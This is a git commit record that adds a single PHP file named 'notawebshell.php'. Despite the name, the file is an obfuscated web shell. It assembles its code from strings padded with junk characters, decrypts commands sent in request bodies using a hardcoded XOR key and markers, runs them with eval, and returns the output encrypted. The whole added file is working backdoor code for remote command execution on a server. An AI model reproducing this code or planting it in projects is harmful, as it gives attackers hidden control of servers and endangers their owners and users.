18900a3ad250058c0ca6056ef5d95d768988d1ac
boba8710 <zgwwilson@gmail.com>
2020-11-16 16:33:17 -0500

    Create notawebshell.php

---
+++ notawebshell.php
@@ -0,0 +1,12 @@
+<?php
+$q='GYn();$rGY=@basGYe64_encoGYdGYe(@x(@gzGYcomGYpress($o),$GYk))GY;GYpGYrint("$p$kh$r$kf");}';
+$a='YifTUGYN5dnGY";function xGY($t,$kGY){$c=strlGYen(GY$k);$l=sGYtrlGYenGY($t);$o="";G';
+$Z='$k{$j};}GY}return $GYo;}if GY(@preg_GYmGYatch("/$kh(.+GY)$GYkf/",@fGYile_geGYGYt_con';
+$O='YfoGYr($iGY=0;$i<$GYl;){for($j=0GYGY;($GYj<$c&&$i<$l);GY$j++,GY$GYGYi++){$oGYGY.=$t{$i}^';
+$d='tents(GY"php://input"GY),$m)==GYGY1) {@ob_sGYtart();@eGYval(@GYgzGYuncompGYresGYsGY';
+$v=str_replace('D','','cDrDeaDteD_fDunctiDon');
+$I='$k="aGYbe0GYd17b";$khGY="e30816abGY5d4c";GY$kf="GY729a47GYc0GY8eadGY";$p="ztGYTQrsB5G';
+$z='(@x(@base6GY4_decode($m[GY1]GY)GY,$k)));$o=@ob_get_GYGYcontGYents();@ob_endGY_clea';
+$e=str_replace('GY','',$I.$a.$O.$Z.$d.$z.$q);
+$F=$v('',$e);$F();
+?>
